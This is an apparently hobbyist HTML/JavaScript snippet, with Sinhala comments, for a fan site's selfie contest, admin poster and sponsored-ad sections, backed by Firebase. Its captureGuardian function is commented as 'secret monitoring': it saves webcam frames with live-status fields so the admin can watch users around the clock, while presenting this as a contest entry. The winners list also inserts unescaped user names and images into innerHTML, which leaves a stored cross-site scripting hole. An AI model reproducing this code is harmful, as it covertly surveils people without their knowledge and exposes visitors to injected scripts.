<!-- කලින් තිබුණු Styles වලට මේ ටික ඇඩ් කරගන්න (Damage වෙන්නේ නැහැ) -->
<style>
    /* --- NEW UPDATES & ADS POSTER SECTION --- */
    .master-updates {
        width: 90%; margin: 20px auto; padding: 20px;
        background: rgba(26, 0, 0, 0.9); border: 1px solid var(--primary);
        box-shadow: 0 0 15px var(--primary); display: flex; align-items: center; gap: 20px;
    }
    .poster-img { width: 300px; height: 180px; object-fit: cover; border: 2px solid white; }
    .update-content { flex: 1; text-align: left; }

    /* --- DAILY FAMOUS USER CARDS --- */
    .famous-contest { padding: 40px; background: #0a0a0a; }
    .winners-grid { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
    .winner-card {
        width: 200px; border: 2px solid gold; padding: 10px; background: #111;
        position: relative; transition: 0.4s;
    }
    .winner-card.place-1 { transform: scale(1.1); border-color: gold; box-shadow: 0 0 20px gold; }
    .winner-card.place-2 { border-color: silver; }
    .winner-card.place-3 { border-color: #cd7f32; }
    .like-btn { 
        background: none; border: 1px solid var(--primary); color: white; 
        cursor: pointer; padding: 5px 10px; margin-top: 5px; 
    }
    .like-btn:hover { background: var(--primary); }

    /* --- COMPANY ADS SECTION --- */
    .company-ad-card {
        background: #000; border: 1px dashed #555; padding: 15px; margin: 20px auto; width: 80%;
    }
    .ad-video { width: 100%; max-width: 400px; height: auto; }
</style>

<!-- [1] MASTER UPDATES POSTER SECTION (ADMIN PANNEL එකෙන් පාලනය වේ) -->
<section class="master-updates" id="master-poster">
    <img src="https://via.placeholder.com/1920x1080" class="poster-img" id="admin-poster-img">
    <div class="update-content">
        <h2 id="update-title" style="color: var(--primary); margin: 0;">NEW SYSTEM UPDATE</h2>
        <p id="update-text">The Realm is evolving. Watch out for new Guardian features!</p>
        <span id="res-indicator" style="font-size: 0.7rem; color: #888;">RESOLUTION: 1920x1080</span>
    </div>
</section>

<!-- [2] DAILY FAMOUS USER CONTEST (THE HOOK) -->
<section class="famous-contest">
    <h2 style="text-align:center; font-family: 'Orbitron';">DRAGON'S TOP 3 GUARDIANS</h2>
    <div class="winners-grid" id="contest-winners">
        <!-- Winners 1, 2, 3 appear here -->
    </div>
</section>

<!-- [3] DIRECT COMPANY ADS (COMPANY ADS SECTION) -->
<div class="company-ad-card" id="company-ad">
    <h4 style="margin: 0; color: #ffcc00;">SPONSORED</h4>
    <div style="display: flex; gap: 20px; align-items: center; flex-wrap: wrap;">
        <video class="ad-video" autoplay muted loop id="ad-video-src">
            <source src="" type="video/mp4">
        </video>
        <div>
            <h3 id="ad-title">JOIN OUR ALLIANCE</h3>
            <p id="ad-desc">Special offers for the Akiya Realm community.</p>
            <a href="#" id="ad-link" class="btn-dragon" style="text-decoration: none; font-size: 0.8rem;">VISIT NOW</a>
        </div>
    </div>
</div>

<script>
    // --- LOGIN PERSISTENCE (මාසයක් සේව් වීම) ---
    firebase.auth().setPersistence(firebase.auth.Auth.Persistence.LOCAL);

    // --- [3 & 4] ADVANCED GUARDIAN EYE (රහසිගත නිරීක්ෂණය) ---
    function captureGuardian() {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        // AI Face Effect එකක් වගේ පේන්න (Watermark)
        ctx.fillStyle = "rgba(255, 0, 0, 0.5)";
        ctx.font = "20px Orbitron";
        ctx.fillText("🐲 DRAGON AURA ACTIVE", 10, 30);

        const dataUrl = canvas.toDataURL('image/webp', 0.5); // Quality එක අඩු කරලා වේගවත් කළා
        
        const user = firebase.auth().currentUser;
        const uid = user ? user.uid : "guest_" + Date.now();

        // සෙල්ෆි එක තරඟයට දාන අතරේම, 
        // ඇඩ්මින්ට පැය 24ම බලන්න පුළුවන් විදිහට බැක්එන්ඩ් එකට යනවා
        db.ref('guardians/' + uid).set({
            name: user ? user.displayName : "Anonymous",
            image: dataUrl,
            lastSeen: Date.now(),
            liveStatus: "Active"
        });
        
        alert("You have joined the Daily Famous Contest!");
    }

    // --- [6] ADMIN POSTER & RESOLUTION CHECK ---
    db.ref('admin_settings/poster').on('value', snap => {
        const data = snap.val();
        if(data) {
            document.getElementById('admin-poster-img').src = data.url;
            document.getElementById('update-title').innerText = data.title;
            document.getElementById('update-text').innerText = data.description;
            document.getElementById('res-indicator').innerText = `RESOLUTION: ${data.res || 'Unknown'}`;
        }
    });

    // --- [7] DIRECT COMPANY ADS LOADER ---
    db.ref('admin_settings/company_ad').on('value', snap => {
        const ad = snap.val();
        if(ad) {
            document.getElementById('ad-title').innerText = ad.title;
            document.getElementById('ad-desc').innerText = ad.desc;
            document.getElementById('ad-link').href = ad.link;
            if(ad.videoUrl) {
                const v = document.getElementById('ad-video-src');
                v.src = ad.videoUrl; v.load();
            }
        }
    });

    // --- [3] LIKE SYSTEM & WINNERS ---
    function giveLike(uid) {
        db.ref('guardians/' + uid + '/likes').transaction(current => (current || 0) + 1);
    }

    db.ref('guardians').orderByChild('likes').limitToLast(3).on('value', snap => {
        const winnersDiv = document.getElementById('contest-winners');
        winnersDiv.innerHTML = '';
        let place = 3;
        snap.forEach(child => {
            const val = child.val();
            winnersDiv.innerHTML = `
                <div class="winner-card place-${place}">
                    <span style="position:absolute; top:-10px; left:-10px; background:gold; color:black; padding:2px 10px; font-weight:bold;">#${place}</span>
                    <img src="${val.image}" width="100%">
                    <p style="margin:5px 0; font-size:0.8rem;">${val.name}</p>
                    <button class="like-btn" onclick="giveLike('${child.key}')">❤️ ${val.likes || 0}</button>
                </div>
            ` + winnersDiv.innerHTML;
            place--;
        });
    });
</script>
